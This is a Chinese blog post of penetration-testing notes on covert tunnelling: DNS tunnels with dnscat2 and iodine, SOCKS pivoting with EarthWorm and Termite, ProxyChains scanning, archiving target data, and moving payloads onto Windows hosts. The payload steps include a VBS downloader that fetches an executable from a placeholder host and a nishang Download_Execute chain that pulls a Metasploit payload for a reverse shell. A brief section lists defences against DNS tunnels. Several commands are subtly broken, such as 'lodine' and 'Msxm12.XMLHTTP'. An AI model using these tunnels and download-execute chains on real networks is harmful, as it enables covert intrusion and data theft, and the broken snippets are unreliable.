
```


支持多域名并发，可将多个子域绑定在同一个NS下，然后在服务端同时接收多个客户端连接
```bash
ruby dnscat2.rb --dns=port53532 --security=open 
start --den domain=<domain.com>,domain=<domain.com>
```



###### 2).iodine工具
下载地址：https://github.com/Al1ex/iodine
官方文档：http://code.kryo.se/iodine

iodine可以的通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。
C语言开发，分为服务端程序`iodined`和客户端程序`iodine`, Kali内置了iodine

特点：
```bash
- 不会对下行数据进行编码
- 支持多平台，包括Linux,BSD,Mac OS, Windows
- 支持强制密码机制
- 支持同网段隧道IP地址(不同服务器-客户端网段)
- 支持多种DNS记录类型
- 提供了丰富的隧道质量检测措施
```

支持`直接转发`和`中继`两种模式

原理：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道相连，处于同一个局域网(可ping通)。在客户端和服务端之间建立连接后，
客户机会多出一块名为"dns0"的虚拟网卡。

###### 使用
0.先准备域名(和上面类似)
域名服务商：`namecheap`
增加A记录，NS记录
测试DNS是否解析成功

1.安装服务端
```bash
apt-get install iodine

# 启动
iodined -f -c -P pass123456 192.168.1.1 vpn.360bobao.xyz -DD   # 192.168.0.1是虚拟的ip

# 参数含义：
-f    # 前台运行
-c    # 禁止检查所有传入请求客户端IP地址
-P    # 设置验证密码
-D    # 指定调试等级   -DD指第二级， D的数量随等级增加


# 检查配置是否正确
https://code.kryo.se/iodine/check-it
直接输入域名进行检查

```

2.安装iodine客户端
```bash
## 安装
# win
下载win编译好的版本，同时下载openvpn或者TAP网卡驱动程序(安装时仅选择TAP-Win32驱动)

# Linux
apt-get install iodine


## 启动客户端
​```bash
# win(打开里面win32的bin,需要管理员权限)
lodine.exe -f -P pass123456 vpn.360bobao.xyz
#如果出现"COnnection setup complete,tranmitting data"就表示成功
# Linux
lodine -f -P pass123456 vpn.360bobao.xyz -M 200


# 测试能否使用(客户端与服务端已经属于同一内网了)
ping 192.168.1.1    # 虚拟出来的服务端的网卡ip


## 参数：
-r    强制在任何情况下使用DNS隧道(因为有时候会自动动切换为UDP隧道)
-M    指定上行主机名的大小
-m    调节最大下行分片的大小
-T    指定所使用的DNS请求的类型。可选：NULL,PRIVATE,TXT,SRV,CNAME.MX,A
-O    指定数据编码规范
-L    指定是否开启懒惰模式(默认开启)
-I    指定请求与请求之间时间间隔
```

3.使用DNS隧道
```bash
# 由于客户端与服务端已经属于同一内网了，所以直接访问即可
mstsc 192.168.128:3389  # 等方法


# route 可以查看到路由
```


###### 防御DNS隧道的方法
- 禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信
- 虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器/网关会这样做。因此可以将邮件服务器/网关列出白名单并组织传入和传出流量中TXT请求
- 跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告
- 阻止ICMP


###### 各种隧道技术的优劣
<img src="https://image.geoer.cn/20200516154814996_1523296228.png" />

根据实际环境选择技术  
DNS+SSH隧道结合


## <font color=red>SOCKS代理 </font>
**常见的网络场景**
```bash
1.服务器在内网，可以任意访问外部网络
2.服务器在内网，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接
3.服务器在内网，对外只开放了部分端口(如80端口)，且服务器不能访问外部网络
```

<img src="https://image.geoer.cn/20200516172238149_1110777522.png" />

<img src="https://image.geoer.cn/20200516172346684_1234877527.png" />

SOCKS是一种代理服务，可简单的将一端的系统连接另一端。
SOCKS支持多种协议。
SOCKS分为SOCKS4和SOCKS5。SOCKS4只支持TCP协议，SOCKS5不仅支持TCP/UDP，还支持各种身份验证机制等，标准端口为1080。
SOCKS能与目标内网计算机进行通信，避免多次使用端口转发。

###### 常见SOCKS代理工具
可理解为增强版的lcx。他在服务端监听一个端口，当有新连接出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能
socks代理工具尽量选则小且命令行的

**1. EarthWorm(EW)**
跨平台，SOCKS5架构，能以正向、反向、多级级联等方式建立网络隧道
下载地址：https://github.com/rootkiter/EarthWorm
新版本`Termite`: https://github.com/rootkiter/Termite

**2. reGeorg(reDuh的升级版)**
可以使目标服务器在内网中(或者在设置了端口策略的情况下)连接内部开发端口
利用webshell建立一个socks代理进行内网穿透，服务器必须支持ASPX, PHP, JSP中的一种。

**3. sSocks**
支持SOCKS5验证，支持IPv6和UDP，并提供反向SOCKS代理服务(将远程计算机作为SOCKS代理服务端反弹到本地)

**4. SocksCap64**
http://www.sockscap64.com
windows上的全局代理软件
即便是本身不支持SOCKS代理的应用程序，也可以通过其实现代理访问

**5. Proxifier**
https://www.proxifier.com/

**6. ProxyChains**
http://proxychains.sourceforge.net/
https://github.com/haad/proxychains
Linux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器



###### 工具使用
**1. EarthWorm(EW)**
六种命令格式：
```bash
ssocksd    # 用于普通网络环境的正向连接命令
rcsocks    # 用于普通网络环境的反向连接命令
rssocks
lcx_slave
lcx_listen
lcx_tran
```

正向SOCKS 5 服务器
```bash
# 适用于目标机器拥有一个外网ip的情况
ew -s ssocksd -l 888    # 假设一个端口为888的SOCKS代理

# 接下来，可以使用SocksCap64添加这个代理地址即可

```

反弹SOCKS 5 服务器
```bash
# 目标机器没有公网IP地址的情况 / 或者在内网内部用
#1.先把ew上传到公网vps中，并执行
ew -s rcsocks -l 1008 -e 888    # 含义：在公网vps上添加一个转接隧道，把1008收到的代理请求转发给888端
 
#2.然后把ew上传到web服务器(内网)，并执行
ew -s rssocks -d <公网vps_IP> -e 888

#3.然后用SocksCap64等添加代理地址为vps的ip:1008
#4.回到vps发现反弹成功，就可以通过vps的1008端口使用假设在web服务器上的SOCKS5代理服务了

```

多级级联：
Case1. lcx_tran
```bash
# 情景：vps能连接web服务器，web服务器能连接数据库服务器但是不能连接DC，数据库服务器能连接DC但是不能访问外网
# 所以，在数据库服务器建立SOCKS服务，端口转发给web服务器，我们可以直接链接web服务器

# 1.在DB服务器
ew -s ssocksd -l 9999
# 2.在vps 
ew -s lcx_tran -l 1008 -f 127.0.0.1 -g 9999

# 3.使用工具连接vps1008即可
```

Case2. lcx_listen, lcx_slave
```bash
#1. vps
ew -s lcx_listen -l 1080 -e 8888
#2. DB内网主机
ew -s ssocksd -l 9999
#3. 另一台内网主机
ew -s lcx_slave -d 192.168.0.100 -e 8888 -f 1.1.1.10 -g 9999
#4. 最后连接vps的1080端口
```


三级级联
```bash
#1. vps(192.168.0.103)
ew -s lcx_listen -l 1001 -e 113

#2.A
ew -s lcx_slave -d 192.168.0.103 -e 113 -f 1.1.1.10 -g 123

#3. B(1.1.1.10)
ew -s lcx_listen -l 123 -e 133

#4. C主机，启动SOCKS 5服务，并反弹到B主机的123端口
ew -s rssocks -d 1.1.1.10  -e 133

#5. 使用代理工具连接vps的1001

```

**2.Termite**

分为两部分：`admin_exe`和`agent_exe`被控者    

```bash
# Usage

1. 以服务模式启动一个agent服务。

> $ ./agent -l 8888

2. 令管理端连接到agent并对agent进行管理。

> $ ./admin -c 127.0.0.1 -p 8888

3. 此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。

>> help

4. 通过show指令可以得到当前agent的拓扑情况。

>> show 
 0M
 +-- 1M
 由于当前拓扑中只有一个agent，所以展示结果只有 1M ,
  其中1 为节点的ID号，
  M为MacOS系统的简写，Linux为L，Windows简写为W。

5. 将新agent加入当前拓扑
> ./agent -c 127.0.0.1 -p 8888

6. 此时show指令将得到如下效果
 0M
 +-- 1M
 |   +-- 2M
  这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。

7. 在2节点开启socks代理，并绑定在本地端口
>> goto 2
    将当前被管理节点切换为 2 号节点。
>> socks 1080
   此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。

8. 在1号节点开启一个shell并绑定到本地端口
>> goto 1
>> shell 7777
     此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.

9. 将远程的文件下载至本地
>> goto 1
>> downfile 1.txt 2.txt
    将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt

10. 上传文件至远程节点
>> goto 2
>> upfile 2.txt 3.txt
    将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt

11. 端口转接
>> goto 2 
>> lcxtran 3388 10.0.0.1 3389
    以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口


# 更多支持
    http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4
    http://rootkiter.com/toolvideo/toolmp4/2socks.mp4
    http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4
    http://rootkiter.com/toolvideo/toolmp4/4shell.mp4
    http://rootkiter.com/toolvideo/toolmp4/5file.mp4

# 联系作者
    rootkiter@rootkiter.com

```



**3. 在Windows下使用SocksCap64实现内网漫游**
代理服务器先设置：`ew -s lcx_listen -l 10800 -e 888`

以管理员权限打开
1.点击`代理`，添加一个代理(代理服务器的ip和端口)
2.点击闪电图标，测试代理服务器是否正常
3.选择浏览器，右键，选择`在代理隧道中运行选择程序`，然后就可以自由访问内网了




**4. 在Linux下使用ProxyChains实现内网漫游**

```bash
# kali中安装了ProxyChains，只需配置即可
# vim /etc/proxychains.conf
取消 dynamic_chain 的注释
修改 socks 127.0.0.1 1080 为自己的端口

# 测试是否正常
proxyresolv www.baidu.com    
# 如提示没找到命令
cp /usr/lib/proxychains3/proxyresolv /use/bin/

# 启动火狐浏览器(使用socks代理)
proxychains firefox        # 可以访问到内网的站点

# 同样nmap，sqlmap，msf都可以以代理方式运行
proxychains nmap 192.168.0.1/24
proxychains sqlmap -u 192.168.0.12
proxychains msfconsole


```


## <font color=red>压缩数据 </font>

#### 1. RAR
如果目标安装了`win.rar`，则不必再安装；如果没有安装，则手动安装与系统版本对应的，然后把`win.exe`拿出来

参数:
```bash
a    添加要压缩的文件
-k    锁定压缩文件
-s    生成存档文件(提高压缩比)
-p    指定压缩密码
-r    递归压缩
-x    指定要排除的文件
-v    分卷打包(大文件时候用处很大)
-ep    从名称中排除路径
-ep1    从名称中排除基本目录
-m0     存储，添加到压缩文件时不压缩
-m1    最快，使用最快压缩方式(低压缩比)
-m2    较快，使用快速压缩方式
-m3    标准，使用标准压缩方式(默认)
-m4    较好，使用较强压缩方式(速度较慢)
-m5    最好，使用最强压缩方式(最好的压缩方式，但速度最慢)
```

**以RAR格式压缩/解压**
```bash
# 压缩
rar.exe a -k -r -s -m3 C:\\1.rar C:\\apps

# 解压
rar.exe e  C:\\1.rar

# 
-e    # 解压到当前根目录下
-x    # 以绝对路径解压

# zip和rar一样，修改后缀即可
```

**分卷压缩/解压**
```bash
# 压缩(每个卷的大小为20MB)
rar.exe a -m0 -r -v20m  C:\\1.rar C:\\apps

# 解压
rar.exe x  C:\\1.part01.rar C:\\apps
```



#### 2. 7-Zip
下载地址：https://www.7-zip.org/
参数：
```bash
-r    递归压缩
-o    指定输出目录
-p    指定密码
-v    分卷压缩
a    添加压缩文件
x    解压
```

**普通压缩/解压方式**
```bash
# 压缩
7z.exe a -r -p123456 C:\apps\1.7z C:\apps


# 解压
7z.exe x -p123456 C:\apps\1.7z -o C:\apps2
```

**分卷压缩/解压方式**
```bash
# 压缩（每个分卷20MB）
7z.exe a -r -vlm -p123456 C:\apps\1.7z C:\apps


# 解压
7z.exe x -p123456 C:\apps\1.7z.001 -o C:\apps2

```




## <font color=red> 上传和下载</font>
>对于不能上传Shell，但是可以执行命令的Windows服务器，可在shell环境中进行上传下载操作

#### 1.利用FTP上传文件
在本地或vps搭建FTP服务器

常用FTP命令
```bash
open 192.168.0.10    # 连接服务器
cd <目录>
lcd <文件夹路径>    # 定位本地文件夹(上传文件的位置或者下载文件的保存位置)
type    # 查看的当前的传输方式(默认是ASCII码传输)
ascii    # 设置传输方式为ascii（传输txt等）
binary    # 设置传输方式为二进制传输（传输exe图片视频声音等）
close        # 结束与服务器的FTP对话
quit    # 结束与服务器的FTP对话并推出FTP环境
put <文件名> [newname]    # 上传，如果不指定newname，就为原名字
send <文件名> [newname]    # 上传，如果不指定newname，就为原名字
get <文件名> [newname]    # 下载，如果不指定newname，就为原名字
mget filename [filename]  # 下载多个文件。支持空格和"?"两个通配符（比如: mget .mp3 表示下载FTP服务器当前目录下拓展名为mp3的文件）

```


#### 2. 利用VBS上传文件
主要是是使用`msxm12.xmlhttp`和`adoab.stream`

上传
```vbs

```

下载
```vba
//把下面的命令以此保存到文件（比如 echo "xxxxxxx" >> download.vbs）
Set Post = CreateObject("Msxm12.XMLHTTP");
Set Shell = CreateObject("Wscript.Shell");
Post.Open "GET","http://xxxx/target.exe"
Post.Send();
Set aGet = CreateObject("ADODB.Stream");
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody);
aGet.SaveToFile "C:\\test\target.exe",2


//保存为download.vbs后，然后执行下面的命令
cscript download.vbs

```

#### 3. 利用Debug上传
**原理：**将需要上传的exe文件转换为16进制hex形式，再通过echo命令将hex代码写入文件，最后利用Debug功能将hex代码编译并还原为exe文件

```bash
# exe2bat.exe 只支持<64KB的文件，方法也较古老
# kali中，exe2bat.exe位于/usr/share/windows-binaries目录下。
# 1.在该目录下执行如下命令，把需要上传的ew.exe文件转换成hex形式
wine exe2bat.exe ew.exe ew.txt        # 这里，测试ew.exe代理工具

# 2.然后把上面生成的文本内容复制，echo到目标系统的某个空文件。依次执行命令，生成1.dll, 123.hex, ew.exe
copy 1.dll ew.exe

```


#### 4. 利用Nishang上传

```bash
# nishang中的脚本：Download_Execute    --> 常用来下载文本文件并将其转为exe文件

#1. 先echo 方法把脚本内容传到目标机器，并将扩展名改为ps1

#2. 利用nishang中的exetotext.ps1脚本将msf生成的msf.exe修改为文本文件msf.txt
.\ExetoText c:\msf.exe c:\msf.txt

#3. 调用Download_Execute来下载并执行该文件
Download_Execute http://xxxxxx/msf.txt

#4. 回到msf的监听窗口，可以看到反弹的shell

```


#### 5. 利用bitsadmin下载
命令行工具(win xp之后自带的工具)， 通常同于创建下载和上传进程并检测其进展

如果渗透的目标主机使用了网站代理，并且需要活动目录证书，那么bitsadmin可以帮助解决下载文件的问题
Note：bitsadmin不支持HTTPS和FTP协议，也不支持 win xp/ server 2003及以前的版本


#### 6. 利用PowerShell下载
```bash
Download()
DownloadString()
。。。
```


>整理了一天，越整越乱，头都大了，下次理清了再来优化




---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/  

